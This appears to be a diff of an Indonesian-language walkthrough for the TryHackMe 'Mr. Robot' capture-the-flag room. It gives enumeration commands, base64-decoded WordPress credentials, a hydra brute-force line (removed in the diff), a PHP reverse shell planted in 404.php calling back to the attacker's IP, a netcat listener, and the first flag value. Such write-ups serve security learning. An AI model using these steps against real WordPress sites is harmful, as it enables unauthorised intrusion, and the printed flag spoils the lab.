@@ -1,6 +1,5 @@
 ## 📘 Mr. Robot TryHackMe – Walkthrough Lengkap
 
-**By:** \[username kamu di GitHub]
 **Level:** Easy - Medium
 **Platform:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)
 
@@ -16,13 +15,15 @@ Mendapatkan akses awal ke mesin dan menemukan `key-1-of-3.txt`.
 
 ## 🧾 1. Inisialisasi
 
-* **IP Mesin:** `10.10.11.154` (contoh, sesuaikan dengan mesin kamu)
-* Pastikan kamu sudah connect ke VPN TryHackMe
-* Tools utama: `nmap`, `nikto`, `gobuster`, `hydra`, `wpscan` (opsional)
+* **IP Mesin:** `10.10.11.154` *(Contoh — sesuaikan dengan IP asli dari TryHackMe)*
+* Pastikan sudah terhubung ke VPN TryHackMe
+* Tools yang digunakan: `nmap`, `gobuster`, `curl`, `wget`, `base64`
 
 ---
 
 ## 🔍 2. Nmap Scan
+
+Lakukan full scan untuk semua port:
 
 ```bash
 nmap -sS -sV -T4 -Pn -p- 10.10.11.154
@@ -30,37 +31,37 @@ nmap -sS -sV -T4 -Pn -p- 10.10.11.154
 
 📌 **Hasil penting:**
 
+* Port 22: SSH
 * Port 80: HTTP
 * Port 443: HTTPS
-* Port 22: SSH (belum bisa dipakai)
 
 ---
 
-## 🌐 3. Buka Web & Lakukan Pemeriksaan Awal
+## 🦾 3. Enumerasi Direktori dengan Gobuster
 
-Akses di browser:
+Gunakan `gobuster` untuk menemukan direktori tersembunyi:
 
+```bash
+gobuster dir -u http://10.10.11.154 -w /usr/share/wordlists/dirb/common.txt
 ```
-http://10.10.11.154
-```
 
-📌 Ada halaman WordPress bertema Mr. Robot (fsociety).
+📌 **Ditemukan antara lain:**
 
-View page source → kamu akan melihat file:
-
-```
-robots.txt
-```
+* `/robots.txt`
+* `/license`
+* `/wp-login.php`
 
 ---
 
-## 🗂️ 4. Cek robots.txt
+## 📄 4. Cek robots.txt
+
+Download konten `robots.txt`:
 
 ```bash
 curl http://10.10.11.154/robots.txt
 ```
 
-📄 Output:
+📥 Output:
 
 ```
 User-agent: *
@@ -68,7 +69,7 @@ fsocity.dic
 key-1-of-3.txt
 ```
 
-✅ **Download filenya**:
+✅ **Unduh file yang disebutkan:**
 
 ```bash
 wget http://10.10.11.154/fsocity.dic
@@ -77,93 +78,111 @@ wget http://10.10.11.154/key-1-of-3.txt
 
 ---
 
-## 🔑 5. Flag Pertama: key-1-of-3.txt
+## 🗝️ 5. Flag Pertama: key-1-of-3.txt
+
+Cek isi filenya:
 
 ```bash
 cat key-1-of-3.txt
 ```
 
-🎉 Kamu akan lihat flag pertama. Simpan ya!
+📌 Output:
+
+```
+073403c8a58a1f80d943455fb30724b9
+```
 
 ---
 
-## 🔍 6. Enumerasi Username WordPress
+## 📄 6. Cek `/license` – Berisi User dan Password (Base64)
+
+Setelah melakukan enumerasi direktori menggunakan `gobuster`, ditemukan file:
+
+```
+http://10.10.11.154/license
+```
+
+📥 Isinya (dalam Base64):
+
+```text
+ZWxsaW90OkVSMjgtMDY1Mg==
+```
+
+🔓 Decode menggunakan:
 
 ```bash
-wpscan --url http://10.10.11.154 -e u
+echo ZWxsaW90OkVSMjgtMDY1Mg== | base64 -d
 ```
 
-📌 Akan muncul:
+📌 Output:
 
 ```
-Found user: elliot
+elliot:ER28-0652
 ```
 
----
-
-## 🧨 7. Brute Force Login WordPress
-
-Gunakan `fsocity.dic` sebagai wordlist:
-
-```bash
-hydra -l elliot -P fsocity.dic 10.10.11.154 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Dashboard"
-```
-
-✅ Setelah cukup lama, hasilnya:
-
-```
-[80][http-post-form] login: elliot   password: ER28-0652
-```
-
----
-
-## 🔐 8. Login ke WordPress
-
-Akses:
-
-```
-http://10.10.11.154/wp-login.php
-```
-
-Gunakan:
+Jadi kita mendapatkan kredensial login WordPress langsung dari file ini:
 
 * **Username:** elliot
 * **Password:** ER28-0652
 
 ---
 
-## 💣 9. Upload Reverse Shell via Plugin Editor
+## 🔐 7. Login ke WordPress
 
-* Buka menu **Appearance > Editor**
-* Pilih `404.php`
-* Replace isinya dengan PHP reverse shell dari [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+Akses halaman login WordPress:
 
-Ubah IP kamu (tun0) dan port, lalu simpan.
+```
+http://10.10.11.154/wp-login.php
+```
+
+Gunakan kredensial hasil decode:
+
+* **Username:** elliot
+* **Password:** ER28-0652
+
+✅ Setelah login berhasil, kita bisa lanjut eksploitasi.
+
+---
+
+## 💣 8. Upload Reverse Shell via Theme Editor
+
+Setelah login ke dashboard WordPress:
+
+1. Buka menu **Appearance > Theme Editor**
+2. Pilih file `404.php`
+3. Ganti seluruh isi file dengan [PHP reverse shell dari pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+4. Ubah IP dan port kamu di baris berikut:
 
 ```php
 $ip = 'YOUR_TUN0_IP';
 $port = 4444;
 ```
 
+✅ Simpan perubahan.
+
 ---
 
-## 📡 10. Jalankan Netcat Listener
+## 📡 9. Jalankan Netcat Listener
+
+Di terminal kamu:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Lalu akses:
+Lalu akses file:
 
 ```
 http://10.10.11.154/404.php
 ```
 
-🎉 Kamu akan dapet reverse shell sebagai `www-data`.
+🎉 Boom! Reverse shell sebagai user `www-data` akan terbuka.
 
 ---
 
-## 📁 11. Stabilkan Shell (Opsional)
+## 🛠️ 10. Stabilkan Shell (Opsional)
+
+Untuk kenyamanan, stabilkan shell:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -171,7 +190,6 @@ export TERM=xterm
 ```
 
 ---
-
 
 # ✅ PART 2 – USER PRIVILEGE ESCALATION 🧗‍♂️
 
@@ -408,37 +426,39 @@ THM{...flag content...}
 
 ---
 
-## 🔚 Ringkasan Flag:
+## 🔚 Ringkasan Flag
 
-| Flag           | Lokasi         | Catatan                     |
-| -------------- | -------------- | --------------------------- |
-| key-1-of-3.txt | `/robots.txt`  | Diakses dari web            |
-| key-2-of-3.txt | `/home/robot/` | Butuh login ke user `robot` |
-| key-3-of-3.txt | `/root/`       | Butuh akses root            |
+| 🏴 Flag        | 📂 Lokasi         | 📝 Catatan                                |
+| -------------- | ----------------- | ----------------------------------------- |
+| key-1-of-3.txt | `/key-1-of-3.txt` | Ditemukan via `gobuster` dan `robots.txt` |
+| key-2-of-3.txt | `/home/robot/`    | Perlu akses user `robot`                  |
+| key-3-of-3.txt | `/root/`          | Perlu akses root (privilege escalation)   |
 
 ---
 
-## ✅ Tools yang Dipakai
+## ✅ Tools yang Digunakan
 
-| Tools      | Fungsi                      |
-| ---------- | --------------------------- |
-| `nmap`     | Network & port scan         |
-| `gobuster` | Directory brute-forcing     |
-| `hydra`    | Brute-force login WordPress |
-| `wpscan`   | WordPress user enumeration  |
-| `netcat`   | Reverse shell listener      |
-| `find`     | Mencari file SUID           |
+| 🛠️ Tools     | 🔍 Fungsi                                |
+| ------------- | ---------------------------------------- |
+| `nmap`        | Melakukan scan port dan service          |
+| `gobuster`    | Enumerasi direktori tersembunyi          |
+| `curl`/`wget` | Mendownload file dari server             |
+| `base64`      | Decode string credential dari `/license` |
+| `netcat`      | Reverse shell listener                   |
+| `python`      | Stabilkan shell + privilege escalation   |
+| `find`        | Mencari file dengan permission SUID      |
 
 ---
 
 ## 👨‍💻 Catatan Akhir
 
-Challenge ini mengajarkan kamu tentang:
+Challenge ini mengajarkan teknik-teknik penting seperti:
 
-* Enumeration dasar web dan WordPress
-* Brute force WordPress login
-* Upload reverse shell via plugin editor
-* Cracking MD5 hash
-* Escalasi privilege dengan binary SUID (`nmap`)
+* 📁 **Web enumeration** menggunakan `gobuster`
+* 🔐 **Credential harvesting** dari file Base64
+* ⚙️ **Login WordPress dan reverse shell** via theme editor
+* 🔑 **Privilege escalation** via binary SUID (`nmap`)
+* 🧠 **Pentingnya observasi & eksplorasi file aneh seperti `/license`**
 
----
+
+
